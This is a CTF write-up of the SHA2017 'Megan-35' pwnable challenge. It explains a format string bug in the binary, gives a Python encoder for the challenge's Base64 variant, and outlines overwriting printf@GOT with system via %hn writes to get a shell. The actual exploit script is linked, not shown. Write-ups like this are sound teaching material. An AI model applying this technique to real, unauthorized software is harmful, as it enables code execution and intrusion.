# Megan-35 (200pt)

**`Pwnable`**

**Description:** We created our own Megan-35 decoding tool, feel free to test it. System is running Ubuntu 16.04, ASLR is disabled.

**Files:**

* [megan-35](/code/2017/SHA2017/megan-35/megan-35)
* [libc.so.6](/code/2017/SHA2017/megan-35/libc.so.6)
* Exploit script: [solveMegan35.py](/code/2017/SHA2017/megan-35/solveMegan35.py)

# Solution

This was a pretty standard format string attack. The approach I used was to perform four writes at once to do the following:
- replace `printf@GOT` with `<system>`
- replace the saved return pointer with `<main>`

Then the program would effectively loop and call `system(user_input)` instead of `printf(user_input)`.

# Vulnerable Code

The actual vulnerability occured here near the end of `<main>`:

```x86asm
             __pic:
0804854c         pop        edx
0804854d         pop        ecx
0804854e         push       eax                                                 ; argument "src" for method j_strcpy
0804854f         push       ebx                                                 ; argument "dst" for method j_strcpy
08048550         call       j_strcpy
08048555         mov        dword [esp+0x238+var_238], ebx                      ; argument "format" for method j_printf
08048558         call       j_printf
0804855d         mov        edx, dword [ebp+var_1C]
08048560         xor        edx, dword [gs:0x14]
08048567         je         loc_804856e
```

The only gotcha was that the input was decoded using Megan-35 before it was printed. It turns out that Megan-35 is just Base64 with a different charset (I really have no idea why it exists).

Anyways, I was able to use the following python script to encode text:

```py
import base64

char_megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
char_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
char_map = dict(zip(char_base64, char_megan35))

def m35encode(s):
    b = base64.b64encode(s)
    return ''.join([char_map[x] for x in b])
```

# Crafting the Exploit

Using gdb to examine memory, I could see that the encoded text was stored on the stack starting at offset `7`. In order to maintain the address pointers, I sent them as plaintext. However, the actual format string attack had to be encoded with Megan-35.

Since ASLR was disabled, it was easy to leak a libc address and calculate the address of system using the provided libc.so binary.

Using the same method, you could leak a stack pointer and calculate the offset to the return address.

Once you had both these values, you could craft a 4 part format string attack (writing two bytes with `$hn`) and get a shell.
